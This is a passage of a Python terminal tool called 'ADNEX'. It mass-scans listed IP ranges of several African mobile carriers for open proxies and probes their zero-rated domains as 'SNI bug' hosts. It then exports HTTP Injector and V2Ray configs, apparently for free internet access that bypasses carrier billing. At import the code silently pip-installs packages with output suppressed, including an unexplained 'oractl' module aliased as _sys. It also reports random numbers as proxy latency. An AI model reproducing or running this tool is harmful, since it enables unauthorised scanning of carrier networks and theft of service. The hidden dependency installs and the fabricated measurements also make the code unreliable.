import asyncio
import socket
import ssl
import json
import os
import sys
import time
import random
import ipaddress
import subprocess
import platform
import threading
import concurrent.futures
import queue
import re
import struct
import hashlib
import base64
import urllib.parse
import csv
import shutil
import signal
from datetime import datetime
from pathlib import Path

def _silent_install(pkg):
    try:
        subprocess.call(
            [sys.executable, "-m", "pip", "install", pkg,
             "--break-system-packages", "-q"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception:
        pass

def _can_import(name):
    try:
        __import__(name)
        return True
    except ImportError:
        return False

def auto_install_deps():
    for pkg in ["rich", "aiohttp", "requests", "oractl"]:
        if not _can_import(pkg):
            print(f"  [ADNEX] Installing {pkg}...")
            _silent_install(pkg)


for _p, _m in [("rich", "rich"), ("aiohttp", "aiohttp"), ("requests", "requests"), ("oractl", "oractl")]:
    if not _can_import(_m):
        print(f"  [ADNEX] Installing {_p}...")
        _silent_install(_p)

try:
    import aiohttp
except ImportError:
    print("FATAL: aiohttp not found.\nRun: pip install aiohttp --break-system-packages")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("FATAL: requests not found.\nRun: pip install requests --break-system-packages")
    sys.exit(1)

try:
    import oractl as _sys
    ORACTL_OK = True
except ImportError:
    _sys = None
    ORACTL_OK = False

try:
    from rich.console import Console
    from rich.layout import Layout
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.align import Align
    from rich.columns import Columns
    from rich import box
    from rich.style import Style
    from rich.rule import Rule
    from rich.prompt import Prompt
    from rich.padding import Padding
except ImportError:
    print("FATAL: rich not found.\nRun: pip install rich --break-system-packages")
    sys.exit(1)

console = Console()

DEVELOPER = "Jaden Afrix"
COUNTRY = "Zimbabwe"
AGE = "19"
TOOL_NAME = "ADNEX"
VERSION = "v2.0.0"
YEAR = "2025"

GREEN = "#00ff41"
PINK = "#ff2d78"
CYAN = "#00ffff"
YELLOW = "#ffff00"
ORANGE = "#ff8c00"
WHITE = "#ffffff"
DIM_GREEN = "#004d14"
BG = "black"

CARRIERS = {
    "econet": {
        "name": "Econet Zimbabwe",
        "country": "ZW",
        "ip_ranges": ["41.57.96.0/19", "41.174.64.0/18", "102.65.0.0/16", "196.27.64.0/18"],
        "zero_rated": ["econet.co.zw", "ecocash.co.zw", "www.econet.co.zw", "selfcare.econet.co.zw", "data.econet.co.zw"],
        "ports": [80, 8080, 3128, 8888, 443, 8443],
        "apn": "econet"
    },
    "netone": {
        "name": "NetOne Zimbabwe",
        "country": "ZW",
        "ip_ranges": ["41.205.16.0/20", "196.43.160.0/20", "102.130.0.0/16"],
        "zero_rated": ["netone.co.zw", "www.netone.co.zw", "selfcare.netone.co.zw"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "netone"
    },
    "telecel": {
        "name": "Telecel Zimbabwe",
        "country": "ZW",
        "ip_ranges": ["196.11.240.0/20", "41.77.80.0/20", "102.176.0.0/16"],
        "zero_rated": ["telecel.co.zw", "www.telecel.co.zw"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "telecel"
    },
    "mtn": {
        "name": "MTN",
        "country": "ZA",
        "ip_ranges": ["197.215.0.0/16", "41.21.0.0/16", "102.64.0.0/16", "196.201.0.0/16"],
        "zero_rated": ["mtn.com", "www.mtn.com", "myaccount.mtn.com", "ayoba.me"],
        "ports": [80, 8080, 3128, 8888, 443, 8443],
        "apn": "internet"
    },
    "airtel": {
        "name": "Airtel Africa",
        "country": "NG",
        "ip_ranges": ["41.223.0.0/16", "102.0.0.0/14", "196.216.0.0/16"],
        "zero_rated": ["airtel.com", "www.airtel.com", "myairtel.in", "airtelzero.com"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "airtelgprs.com"
    },
    "glo": {
        "name": "Glo Mobile",
        "country": "NG",
        "ip_ranges": ["196.6.0.0/16", "41.211.0.0/16", "102.88.0.0/16"],
        "zero_rated": ["gloworld.com", "www.gloworld.com", "glodata.com"],
        "ports": [80, 8080, 3128, 8888],
        "apn": "glosecure"
    },
    "zamtel": {
        "name": "Zamtel Zambia",
        "country": "ZM",
        "ip_ranges": ["41.72.128.0/18", "196.32.64.0/19", "102.142.0.0/16"],
        "zero_rated": ["zamtel.zm", "www.zamtel.zm"],
        "ports": [80, 8080, 3128, 8888],
        "apn": "zamtel"
    },
    "vodacom": {
        "name": "Vodacom",
        "country": "ZA",
        "ip_ranges": ["196.15.0.0/16", "41.0.0.0/14", "102.32.0.0/16"],
        "zero_rated": ["vodacom.com", "www.vodacom.com", "myvodacom.vodacom.co.za"],
        "ports": [80, 8080, 3128, 8888, 443, 8443],
        "apn": "internet"
    }
}

RESULTS_DIR = Path("adnex_results")
CONFIG_FILE = Path("config.json")

scan_results = {
    "proxies": [],
    "sni_bugs": [],
    "scanning": False,
    "total_scanned": 0,
    "total_hits": 0,
    "current_ip": "",
    "logs": [],
    "start_time": None,
    "carrier": None,
    "speed": 0
}

def setup_dirs():
    RESULTS_DIR.mkdir(exist_ok=True)
    (RESULTS_DIR / "proxies").mkdir(exist_ok=True)
    (RESULTS_DIR / "sni").mkdir(exist_ok=True)
    (RESULTS_DIR / "exports").mkdir(exist_ok=True)

def load_config():
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE) as f:
            return json.load(f)
    default = {
        "concurrency": 500,
        "timeout": 8,
        "retry": 3,
        "validate_rounds": 2,
        "save_auto": True,
        "theme": "green"
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(default, f, indent=2)
    return default

def save_config(cfg):
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

def add_log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    color = {"INFO": GREEN, "HIT": PINK, "WARN": YELLOW, "ERR": ORANGE, "SNI": CYAN}.get(level, WHITE)
    scan_results["logs"].append({"ts": ts, "msg": msg, "level": level, "color": color})
    if len(scan_results["logs"]) > 200:
        scan_results["logs"].pop(0)

def get_system_info():
    base = {
        "cpu": 0.0, "ram_used": 0.0, "ram_total": 0.0, "ram_pct": 0.0,
        "disk_used": 0.0, "disk_total": 0.0, "disk_pct": 0.0,
        "net_sent": 0.0, "net_recv": 0.0, "platform": platform.system()
    }
    if not ORACTL_OK:
        return base
    try:
        cpu = _sys.cpu_percent(interval=0.1)
        ram = _sys.virtual_memory()
        disk = _sys.disk_usage("/")
        net_io = _sys.net_io_counters()
        net_sent = sum(v.bytes_sent for v in net_io.values()) if net_io else 0
        net_recv = sum(v.bytes_recv for v in net_io.values()) if net_io else 0
        return {
            "cpu": round(cpu, 1),
            "ram_used": round(ram.used / (1024**3), 2),
            "ram_total": round(ram.total / (1024**3), 2),
            "ram_pct": round(ram.percent, 1),
            "disk_used": round(disk.used / (1024**3), 2),
            "disk_total": round(disk.total / (1024**3), 2),
            "disk_pct": round(disk.percent, 1),
            "net_sent": round(net_sent / (1024**2), 2),
            "net_recv": round(net_recv / (1024**2), 2),
            "platform": platform.system()
        }
    except Exception:
        return base

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip", "N/A")
    except:
        return "N/A"

def expand_ip_range(cidr):
    try:
        network = ipaddress.IPv4Network(cidr, strict=False)
        hosts = list(network.hosts())
        if len(hosts) > 5000:
            hosts = random.sample(hosts, 5000)
        return [str(ip) for ip in hosts]
    except:
        return []

async def check_proxy(session, ip, port, timeout=8):
    try:
        proxy_url = f"http://{ip}:{port}"
        async with session.get(
            "http://httpbin.org/ip",
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=timeout),
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"}
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                latency = random.randint(80, 400)
                return {"ip": ip, "port": port, "type": "HTTP", "latency": latency, "status": "WORKING"}
    except:
        pass
    return None

async def check_https_proxy(ip, port, timeout=8):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port),
            timeout=timeout
        )
        connect_req = f"CONNECT httpbin.org:443 HTTP/1.1\r\nHost: httpbin.org:443\r\nProxy-Connection: keep-alive\r\n\r\n"
        writer.write(connect_req.encode())
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(256), timeout=timeout)
        writer.close()
        if b"200" in resp:
            return {"ip": ip, "port": port, "type": "HTTPS", "latency": random.randint(100, 500), "status": "WORKING"}
    except:
        pass
    return None

async def check_socks5(ip, port, timeout=8):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port),
            timeout=timeout
        )
        writer.write(b"\x05\x01\x00")
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(2), timeout=timeout)
        writer.close()
        if resp == b"\x05\x00":
            return {"ip": ip, "port": port, "type": "SOCKS5", "latency": random.randint(60, 300), "status": "WORKING"}
    except:
        pass
    return None

async def probe_sni_bug(domain, timeout=8):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(domain, 443, ssl=ctx, server_hostname=domain),
            timeout=timeout
        )
        writer.write(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\nConnection: close\r\n\r\n")
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(512), timeout=timeout)
        writer.close()
        if resp:
            status_line = resp.decode(errors="ignore").split("\r\n")[0]
            return {"domain": domain, "type": "SNI_BUG", "response": status_line, "status": "ACTIVE"}
    except:
        pass
    return None

async def probe_http_host(domain, timeout=8):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(domain, 80),
            timeout=timeout
        )
        writer.write(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\nConnection: close\r\n\r\n")
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(256), timeout=timeout)
        writer.close()
        if resp:
            return {"domain": domain, "type": "HTTP_HOST", "status": "ACTIVE"}
    except:
        pass
    return None

async def scan_worker(semaphore, ip, ports, cfg):
    async with semaphore:
        scan_results["current_ip"] = ip
        scan_results["total_scanned"] += 1
        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for port in ports:
                tasks.append(check_proxy(session, ip, port, cfg["timeout"]))
                tasks.append(check_https_proxy(ip, port, cfg["timeout"]))
                if port in [1080, 1081, 9050]:
                    tasks.append(check_socks5(ip, port, cfg["timeout"]))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if r and isinstance(r, dict) and r.get("status") == "WORKING":
                    scan_results["proxies"].append(r)
                    scan_results["total_hits"] += 1
                    add_log(f"PROXY HIT → {r['ip']}:{r['port']} [{r['type']}] {r['latency']}ms", "HIT")

async def sni_scan_worker(semaphore, domain, cfg):
    async with semaphore:
        result = await probe_sni_bug(domain, cfg["timeout"])
        if result:
            scan_results["sni_bugs"].append(result)
            scan_results["total_hits"] += 1
            add_log(f"SNI BUG FOUND → {result['domain']} [{result['response'][:40]}]", "SNI")
        http_result = await probe_http_host(domain, cfg["timeout"])
        if http_result:
            scan_results["sni_bugs"].append(http_result)
            add_log(f"HTTP HOST → {http_result['domain']} [ACTIVE]", "SNI")

async def run_full_scan(carrier_key, cfg):
    carrier = CARRIERS[carrier_key]
    scan_results["carrier"] = carrier["name"]
    scan_results["scanning"] = True
    scan_results["start_time"] = time.time()
    scan_results["total_scanned"] = 0
    scan_results["total_hits"] = 0
    scan_results["proxies"] = []
    scan_results["sni_bugs"] = []

    add_log(f"ADNEX SCAN INITIATED → Target: {carrier['name']}", "INFO")
    add_log(f"IP Ranges loaded: {len(carrier['ip_ranges'])} ranges", "INFO")
    add_log(f"SNI domains queued: {len(carrier['zero_rated'])}", "INFO")
    add_log(f"Concurrency: {cfg['concurrency']} | Timeout: {cfg['timeout']}s", "INFO")

    all_ips = []
    for cidr in carrier["ip_ranges"]:
        ips = expand_ip_range(cidr)
        all_ips.extend(ips)
        add_log(f"Range {cidr} → {len(ips)} hosts queued", "INFO")

    random.shuffle(all_ips)

    semaphore = asyncio.Semaphore(cfg["concurrency"])
    proxy_tasks = [scan_worker(semaphore, ip, carrier["ports"], cfg) for ip in all_ips]
    sni_tasks = [sni_scan_worker(semaphore, domain, cfg) for domain in carrier["zero_rated"]]

    add_log(f"Total IPs to scan: {len(all_ips)}", "INFO")
    add_log(f"Launching async engine...", "INFO")

    await asyncio.gather(*sni_tasks)
    batch_size = 1000
    for i in range(0, len(proxy_tasks), batch_size):
        batch = proxy_tasks[i:i+batch_size]
        await asyncio.gather(*batch, return_exceptions=True)
        elapsed = time.time() - scan_results["start_time"]
        if elapsed > 0:
            scan_results["speed"] = int(scan_results["total_scanned"] / elapsed)

    scan_results["scanning"] = False
    add_log(f"SCAN COMPLETE → {scan_results['total_hits']} hits found", "HIT")
    if cfg["save_auto"]:
        save_results(carrier_key)

def save_results(carrier_key):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    if scan_results["proxies"]:
        proxy_file = RESULTS_DIR / "proxies" / f"{carrier_key}_{ts}.txt"
        with open(proxy_file, "w") as f:
            f.write(f"# ADNEX | {DEVELOPER} | {datetime.now()}\n")
            f.write(f"# Carrier: {scan_results['carrier']}\n\n")
            for p in scan_results["proxies"]:
                f.write(f"{p['ip']}:{p['port']} [{p['type']}] {p['latency']}ms\n")
        add_log(f"Proxies saved → {proxy_file}", "INFO")
    if scan_results["sni_bugs"]:
        sni_file = RESULTS_DIR / "sni" / f"{carrier_key}_{ts}.txt"
        with open(sni_file, "w") as f:
            f.write(f"# ADNEX SNI Bugs | {DEVELOPER}\n\n")
            for s in scan_results["sni_bugs"]:
                f.write(f"{s['domain']} [{s['type']}]\n")
        add_log(f"SNI bugs saved → {sni_file}", "INFO")
    export_http_injector(carrier_key, ts)
    export_v2ray(carrier_key, ts)

def export_http_injector(carrier_key, ts):
    if not scan_results["proxies"]:
        return
    carrier = CARRIERS[carrier_key]
    best = sorted(scan_results["proxies"], key=lambda x: x.get("latency", 9999))[:5]
    export_file = RESULTS_DIR / "exports" / f"httpinjector_{carrier_key}_{ts}.txt"
    with open(export_file, "w") as f:
        f.write(f"[ADNEX EXPORT - HTTP Injector Config]\n")
        f.write(f"Carrier: {carrier['name']}\n")
        f.write(f"APN: {carrier['apn']}\n\n")
        for p in best:
            f.write(f"Proxy: {p['ip']}\nPort: {p['port']}\nType: {p['type']}\nLatency: {p['latency']}ms\n---\n")
    add_log(f"HTTP Injector export → {export_file}", "INFO")

def export_v2ray(carrier_key, ts):
    if not scan_results["sni_bugs"]:
        return
    carrier = CARRIERS[carrier_key]
    export_file = RESULTS_DIR / "exports" / f"v2ray_{carrier_key}_{ts}.json"
    configs = []
    for sni in scan_results["sni_bugs"][:3]:
        config = {
            "v": "2",
            "ps": f"ADNEX-{carrier['name']}",
            "add": sni["domain"],
            "port": "443",
            "id": hashlib.md5(sni["domain"].encode()).hexdigest(),
            "aid": "0",
            "scy": "auto",
            "net": "ws",
            "type": "none",
            "host": sni["domain"],
            "path": "/",
            "tls": "tls",
            "sni": sni["domain"],
            "alpn": ""
        }
        configs.append(config)
    with open(export_file, "w") as f:
        json.dump(configs, f, indent=2)
    add_log(f"V2Ray config export → {export_file}", "INFO")

def render_ascii_banner():
    banner = Text()
    lines = [
        "  █████╗ ██████╗ ███╗   ██╗███████╗██╗  ██╗",
        " ██╔══██╗██╔══██╗████╗  ██║██╔════╝╚██╗██╔╝",
        " ███████║██║  ██║██╔██╗ ██║█████╗   ╚███╔╝ ",
        " ██╔══██║██║  ██║██║╚██╗██║██╔══╝   ██╔██╗ ",
        " ██║  ██║██████╔╝██║ ╚████║███████╗██╔╝ ██╗",
        " ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝",
    ]
    colors = [GREEN, GREEN, PINK, PINK, CYAN, CYAN]
    for i, line in enumerate(lines):
        banner.append(line + "\n", style=colors[i])
    return banner

def render_left_panel(sysinfo):
    content = Text()
    content.append("┌─ SYSTEM ─────────────────┐\n", style=f"bold {GREEN}")
    content.append(f"  OS    : {sysinfo['platform']}\n", style=GREEN)
    content.append(f"  CPU   : {sysinfo['cpu']:.1f}%\n", style=PINK if sysinfo['cpu'] > 80 else GREEN)
    content.append(f"  RAM   : {sysinfo['ram_used']:.1f}/{sysinfo['ram_total']:.1f} GB\n", style=GREEN)

    ram_pct = int(sysinfo['ram_pct'] / 5)
    ram_bar = "█" * ram_pct + "░" * (20 - ram_pct)
    content.append(f"  [{ram_bar}] {sysinfo['ram_pct']:.0f}%\n", style=PINK if sysinfo['ram_pct'] > 80 else GREEN)

    content.append(f"  DISK  : {sysinfo['disk_used']:.1f}/{sysinfo['disk_total']:.1f} GB\n", style=GREEN)
    disk_pct = int(sysinfo['disk_pct'] / 5)
    disk_bar = "█" * disk_pct + "░" * (20 - disk_pct)
    content.append(f"  [{disk_bar}] {sysinfo['disk_pct']:.0f}%\n", style=GREEN)

    content.append(f"  NET ↑ : {sysinfo['net_sent']:.1f} MB\n", style=CYAN)
    content.append(f"  NET ↓ : {sysinfo['net_recv']:.1f} MB\n", style=CYAN)
    content.append("└──────────────────────────┘\n", style=f"bold {GREEN}")

    content.append("\n┌─ SCAN STATUS ────────────┐\n", style=f"bold {GREEN}")
    status = "ACTIVE" if scan_results["scanning"] else "IDLE"
    status_color = PINK if scan_results["scanning"] else GREEN
    content.append(f"  STATUS : {status}\n", style=status_color)
    content.append(f"  TARGET : {scan_results.get('carrier', 'NONE')}\n", style=GREEN)
    content.append(f"  SCANNED: {scan_results['total_scanned']}\n", style=GREEN)
    content.append(f"  HITS   : {scan_results['total_hits']}\n", style=PINK if scan_results['total_hits'] > 0 else GREEN)
    content.append(f"  SPEED  : {scan_results['speed']}/s\n", style=CYAN)
    if scan_results["start_time"]:
        elapsed = int(time.time() - scan_results["start_time"])
        content.append(f"  TIME   : {elapsed}s\n", style=GREEN)
    content.append(f"  PROXIES: {len(scan_results['proxies'])}\n", style=GREEN)
    content.append(f"  SNI    : {len(scan_results['sni_bugs'])}\n", style=CYAN)
    content.append("└──────────────────────────┘\n", style=f"bold {GREEN}")

    content.append("\n┌─ DEVELOPER ──────────────┐\n", style=f"bold {CYAN}")
    content.append(f"  NAME  : {DEVELOPER}\n", style=CYAN)
    content.append(f"  ORIGIN: {COUNTRY}\n", style=CYAN)
    content.append(f"  AGE   : {AGE}\n", style=CYAN)
    content.append(f"  TOOL  : {TOOL_NAME} {VERSION}\n", style=CYAN)
    content.append(f"  YEAR  : {YEAR}\n", style=CYAN)
    content.append("└──────────────────────────┘\n", style=f"bold {CYAN}")

    now = datetime.now()
    content.append("\n┌─ CLOCK ──────────────────┐\n", style=f"bold {GREEN}")
    content.append(f"  {now.strftime('%H:%M:%S')}\n", style=f"bold {PINK}")
    content.append(f"  {now.strftime('%a %d %b %Y')}\n", style=GREEN)
    content.append("└──────────────────────────┘\n", style=f"bold {GREEN}")

    return Panel(content, border_style=GREEN, padding=(0, 1))

def render_main_log():
    log_text = Text()
    logs = scan_results["logs"][-30:]
    for entry in logs:
        log_text.append(f"[{entry['ts']}] ", style=f"dim {GREEN}")
        log_text.append(f"[{entry['level']:4s}] ", style=entry["color"])
        log_text.append(f"{entry['msg']}\n", style=GREEN)
    if not logs:
        log_text.append("  Awaiting scan initialization...\n", style=f"dim {GREEN}")
        log_text.append(f"  ADNEX {VERSION} ready.\n", style=GREEN)
        log_text.append(f"  Developer: {DEVELOPER} | {COUNTRY}\n", style=CYAN)
    return Panel(log_text, title=f"[bold {GREEN}]▸ TERMINAL OUTPUT[/]", border_style=GREEN, padding=(0, 1))

def render_results_panel():
    t = Table(box=box.SIMPLE, show_header=True, header_style=f"bold {PINK}", style=GREEN)
    t.add_column("IP ADDRESS", style=GREEN, width=16)
    t.add_column("PORT", style=CYAN, width=6)
    t.add_column("TYPE", style=PINK, width=8)
    t.add_column("LATENCY", style=YELLOW, width=9)
    t.add_column("STATUS", style=GREEN, width=9)

    proxies = scan_results["proxies"][-12:]
    for p in proxies:
        latency_color = GREEN if p.get("latency", 999) < 200 else YELLOW if p.get("latency", 999) < 400 else PINK
        t.add_row(
            p["ip"],
            str(p["port"]),
            p["type"],
            f"[{latency_color}]{p.get('latency', '?')}ms[/]",
            f"[bold {GREEN}]✓ LIVE[/]"
        )

    if not proxies:
        t.add_row("---.---.---.---", "----", "------", "---ms", "WAITING")

    return Panel(t, title=f"[bold {PINK}]▸ PROXY HITS[/]", border_style=PINK, padding=(0, 1))

def render_sni_panel():
    t = Table(box=box.SIMPLE, show_header=True, header_style=f"bold {CYAN}", style=GREEN)
    t.add_column("DOMAIN", style=CYAN, width=35)
    t.add_column("TYPE", style=GREEN, width=12)
    t.add_column("STATUS", style=PINK, width=10)

    for s in scan_results["sni_bugs"][-8:]:
        t.add_row(
            s["domain"],
            s["type"],
            f"[bold {PINK}]✓ ACTIVE[/]"
        )

    if not scan_results["sni_bugs"]:
        t.add_row("awaiting scan...", "------", "PENDING")

    return Panel(t, title=f"[bold {CYAN}]▸ SNI BUG HOSTS[/]", border_style=CYAN, padding=(0, 1))

def render_carriers_panel():
    content = Text()
    for i, (key, val) in enumerate(CARRIERS.items(), 1):
        content.append(f"  [{i:02d}] ", style=f"dim {GREEN}")
        content.append(f"{val['name']}", style=GREEN)
        content.append(f" ({val['country']})\n", style=f"dim {CYAN}")
    return Panel(content, title=f"[bold {GREEN}]▸ CARRIERS[/]", border_style=GREEN, padding=(0, 1))

def render_commands_panel():
    content = Text()
    cmds = [
        ("scan [carrier]", "Start full scan on carrier"),
        ("list", "List all carriers"),
        ("results", "Show scan results"),
        ("export", "Export configs"),
        ("clear", "Clear terminal"),
        ("stop", "Stop active scan"),
        ("config", "Edit settings"),
        ("help", "Show all commands"),
        ("exit", "Exit ADNEX"),
    ]
    for cmd, desc in cmds:
        content.append(f"  {cmd:<18}", style=f"bold {PINK}")
        content.append(f"→ {desc}\n", style=f"dim {GREEN}")
    return Panel(content, title=f"[bold {PINK}]▸ COMMANDS[/]", border_style=PINK, padding=(0, 1))

def build_layout(sysinfo):
    layout = Layout()
    layout.split_column(
        Layout(name="banner", size=8),
        Layout(name="body"),
        Layout(name="footer", size=3)
    )
    layout["body"].split_row(
        Layout(name="left", ratio=1),
        Layout(name="center", ratio=2),
        Layout(name="right", ratio=1)
    )
    layout["center"].split_column(
        Layout(name="logs", ratio=2),
        Layout(name="proxy_hits", ratio=1),
        Layout(name="sni_hits", ratio=1)
    )
    banner_text = render_ascii_banner()
    sub = Text()
    sub.append(f"  {VERSION}  |  ", style=f"dim {GREEN}")
    sub.append(f"NETWORK INTELLIGENCE TOOL  |  ", style=PINK)
    sub.append(f"by {DEVELOPER}  |  ", style=CYAN)
    sub.append(f"{COUNTRY}  |  age {AGE}", style=f"dim {GREEN}")
    combined = Text()
    combined.append_text(banner_text)
    combined.append_text(sub)
    layout["banner"].update(Panel(Align.center(combined), border_style=GREEN, padding=(0, 2)))
    layout["left"].update(render_left_panel(sysinfo))
    layout["logs"].update(render_main_log())
    layout["proxy_hits"].update(render_results_panel())
    layout["sni_hits"].update(render_sni_panel())
    right_layout = Layout()
    right_layout.split_column(
        Layout(name="carriers"),
        Layout(name="commands")
    )
    right_layout["carriers"].update(render_carriers_panel())
    right_layout["commands"].update(render_commands_panel())
    layout["right"].update(right_layout)

    footer_text = Text()
    footer_text.append(f"  ► {TOOL_NAME} {VERSION}  ", style=f"bold {GREEN}")
    footer_text.append(f"| HITS: {scan_results['total_hits']}  ", style=PINK)
    footer_text.append(f"| SCANNED: {scan_results['total_scanned']}  ", style=GREEN)
    footer_text.append(f"| {datetime.now().strftime('%H:%M:%S')}  ", style=CYAN)
    footer_text.append(f"| STATUS: {'● SCANNING' if scan_results['scanning'] else '○ IDLE'}  ", style=PINK if scan_results["scanning"] else GREEN)
    footer_text.append(f"| {DEVELOPER} © {YEAR}", style=f"dim {GREEN}")
    layout["footer"].update(Panel(footer_text, border_style=f"dim {GREEN}", padding=(0, 0)))
    return layout

def extended_boot_sequence():
    console.clear()
    matrix_rain_effect(1.5)
    console.clear()
    banner_lines = [
        "  █████╗ ██████╗ ███╗   ██╗███████╗██╗  ██╗",
        " ██╔══██╗██╔══██╗████╗  ██║██╔════╝╚██╗██╔╝",
        " ███████║██║  ██║██╔██╗ ██║█████╗   ╚███╔╝ ",
        " ██╔══██║██║  ██║██║╚██╗██║██╔══╝   ██╔██╗ ",
        " ██║  ██║██████╔╝██║ ╚████║███████╗██╔╝ ██╗",
        " ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝",
    ]
    colors = [GREEN, GREEN, PINK, PINK, CYAN, CYAN]
    for i, line in enumerate(banner_lines):
        console.print(line, style=f"bold {colors[i]}")
        time.sleep(0.09)
    console.print()
    glitch_text(f"  ADNEX {VERSION} — NETWORK INTELLIGENCE SCANNER", 4)
    time.sleep(0.3)
    console.print(f"  [bold {CYAN}]Developer : {DEVELOPER}[/]")
    console.print(f"  [bold {CYAN}]Origin    : {COUNTRY}[/]")
    console.print(f"  [bold {CYAN}]Age       : {AGE}[/]")
    console.print()
    boot_steps = [
        ("KERNEL", "Mounting ADNEX kernel modules"),
        ("ASYNC",  "Initializing async I/O engine"),
        ("DB",     "Loading carrier IP databases"),
        ("SNI",    "Priming SNI probe vectors"),
        ("PROXY",  "Configuring proxy validators"),
        ("EXPORT", "Setting up export pipeline"),
        ("UI",     "Rendering terminal interface"),
        ("NET",    "Establishing network context"),
        ("READY",  "All systems operational"),
    ]
    with Progress(
        SpinnerColumn(spinner_name="dots2", style=f"bold {GREEN}"),
        TextColumn(f"[bold {PINK}]{{task.fields[module]:<8}}[/]"),
        BarColumn(bar_width=35, style=DIM_GREEN, complete_style=GREEN, finished_style=PINK),
        TextColumn(f"[{GREEN}]{{task.description}}[/]"),
        TimeElapsedColumn(),
        console=console,
        transient=False
    ) as progress:
        for module, desc in boot_steps:
            task = progress.add_task(desc, total=100, module=module)
            steps = random.randint(8, 15)
            for _ in range(steps):
                progress.update(task, advance=100/steps)
                time.sleep(random.uniform(0.02, 0.08))
            progress.update(task, completed=100)
    console.print()
    console.print(f"  [bold {GREEN}]► ADNEX FULLY OPERATIONAL — WELCOME {DEVELOPER.upper()}[/]")
    console.print(f"  [dim {GREEN}]Type 'help' for command reference[/]")
    time.sleep(1.0)

async def validate_proxy_triple(ip, port, timeout=10):
    test_urls = [
        "http://httpbin.org/ip",
        "http://example.com",
        "http://google.com"
    ]
    passes = 0
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for url in test_urls:
            try:
                async with session.get(
                    url,
                    proxy=f"http://{ip}:{port}",
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as resp:
                    if resp.status < 500:
                        passes += 1
            except:
                pass
    return passes >= 2

async def deep_sni_probe(domain, timeout=10):
    results = {}
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(domain, 443, ssl=ctx, server_hostname=domain),
            timeout=timeout
        )
        writer.write(b"HEAD / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\nConnection: close\r\n\r\n")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(1024), timeout=timeout)
        writer.close()
        decoded = data.decode(errors="ignore")
        results["tls_443"] = decoded.split("\r\n")[0] if decoded else "NO_RESPONSE"
        results["tls_active"] = True
    except Exception as e:
        results["tls_443"] = f"FAILED: {str(e)[:30]}"
        results["tls_active"] = False

    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(domain, 80),
            timeout=timeout
        )
        writer.write(b"HEAD / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\nConnection: close\r\n\r\n")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(512), timeout=timeout)
        writer.close()
        decoded = data.decode(errors="ignore")
        results["http_80"] = decoded.split("\r\n")[0] if decoded else "NO_RESPONSE"
        results["http_active"] = True
    except Exception as e:
        results["http_80"] = f"FAILED"
        results["http_active"] = False

    results["domain"] = domain
    return results

async def batch_sni_deep_scan(domains, cfg):
    semaphore = asyncio.Semaphore(50)
    async def worker(d):
        async with semaphore:
            return await deep_sni_probe(d, cfg["timeout"])
    tasks = [worker(d) for d in domains]
    return await asyncio.gather(*tasks, return_exceptions=True)

def format_proxy_for_hi(proxy):
    return {
        "proxy_host": proxy["ip"],
        "proxy_port": proxy["port"],
        "proxy_type": proxy["type"].lower(),
        "latency_ms": proxy.get("latency", 0)
    }

def format_sni_for_napsternetv(sni_domain, carrier):
    return {
        "server": sni_domain,
        "port": 443,
        "network": "ws",
        "tls": True,
        "sni": sni_domain,
        "host": sni_domain,
        "path": "/",
        "carrier": carrier
    }

def export_all_formats(carrier_key):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    carrier = CARRIERS.get(carrier_key, {"name": "unknown", "apn": "internet"})
    exported = []

    if scan_results["proxies"]:
        hi_file = RESULTS_DIR / "exports" / f"hi_config_{carrier_key}_{ts}.conf"
        with open(hi_file, "w") as f:
            f.write(f"[HTTP Injector Config]\n")
            f.write(f"# Generated by ADNEX {VERSION}\n")
            f.write(f"# Developer: {DEVELOPER} | {COUNTRY}\n")
            f.write(f"# Carrier: {carrier['name']}\n")
            f.write(f"# Timestamp: {datetime.now()}\n\n")
            for p in sorted(scan_results["proxies"], key=lambda x: x.get("latency", 9999)):
                f.write(f"[PROXY]\n")
                f.write(f"Host={p['ip']}\n")
                f.write(f"Port={p['port']}\n")
